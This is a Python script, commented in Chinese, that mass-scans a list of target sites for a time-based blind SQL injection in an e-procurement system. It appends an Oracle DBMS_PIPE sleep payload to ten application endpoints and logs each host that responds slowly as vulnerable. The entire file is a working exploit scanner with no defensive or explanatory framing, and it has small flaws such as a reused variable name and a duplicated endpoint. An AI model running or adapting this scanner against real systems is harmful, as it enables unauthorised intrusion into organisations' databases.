
import json
import requests
import time


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    urls = ["/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1",
            "/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1",
            "/Price/SuggestList.aspx?priceid=1",
            "/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1",
            "/Products/Category/CategoryOption.aspx?option=IsStop&classId=1",
            "/custom/CompanyCGList.aspx?ComId=1",
            "/SuperMarket/InterestInfoDetail.aspx?ItemId=1",
            "/Orders/k3orderdetail.aspx?FINTERID=1",
            "/custom/CompanyCGList.aspx?ComId=1",
            "/custom/GroupNewsList.aspx?child=true&groupId=121"]
    payload = "%20AnD%206371=DbMs_PiPe.ReCeIvE_MeSsAgE(11,6)"
    try:
        noexist = True
        for turl in urls:
            start_time = time.time()
            vulnurl = url + turl + payload
            req = requests.get(vulnurl, timeout=20, verify=False)
            if time.time() - start_time >= 6:
                print("[+]存在一采通电子采购系统时间盲注漏洞...(高危)\tpayload: " + vulnurl, "red")
                with open('漏洞.txt', 'a')as f:
                    f.write(str(vulnurl) + '\n')
                noexist = False
        if noexist:
            print("[-]不存在caitong_multi_sleep_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")